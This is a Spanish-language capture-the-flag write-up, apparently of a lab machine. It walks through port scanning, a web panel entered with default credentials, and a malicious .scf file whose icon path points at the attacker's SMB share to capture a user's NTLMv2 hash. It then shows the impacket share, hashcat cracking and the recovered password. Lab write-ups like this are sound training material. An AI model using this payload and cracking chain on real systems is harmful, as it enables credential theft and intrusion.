
# Reconocimiento

```shell
nmap -p- --open -sS --min-rate 5000 -n -Pn -vvv 10.129.9.43 -oG allPorts
```

```shell
[*] IP Address: 10.129.9.43
[*] Open ports: 80,135,445,5985
```

```shell
nmap -p80,135,445,5985 -sCV 10.129.9.43 -oN targeted
```


```shell
nxc smb 10.129.9.43
```

## HTTP
Enumeraremos la web para ver los servicios
```shell
whatweb http://10.129.9.43
```

Accedemos a la IP a traves del navegador y probamos a acceder usando `admin::admim`
![[Pasted image 20260304110713.png]]

Nos encontramos en la web en la zona de Firmware Updates con un mensaje que nos dice que el contenido que subamos va a ser visualizado por otro usuario

Crearemos un fichero `.scf` ya que al subir un archivo y un segundo usuario revisarlo, se puede cargar un fichero malicioso de este tipo, a la hora de que a la hora de llamar al archivo poder obtener el hash `NTLMv2`

El fichero deberá de tener el siguiente contenido
```shell
[Shell]
Command=2
IconFile=\\10.10.15.165\smbfolder\pentestlab.ico
[Taskbar]
Command=ToggleDesktop
```

Nos lo compartiremos como recurso de red con [[IMPACKET]]
```shell
impacket-smbserver smbfolder $(pwd) -smb2support
```

Lo subiremos y podremos obtener el hash `NTLMv2` del usuario `toni`

Ahora el hash lo podemos crackear usando [[HASHCAT]]
```shell
hashcat hash /usr/share/wordlists/rockyou.txt
```

Obteniendo las siguientes credenciales validas
```ad-hint
tony::liltony
```

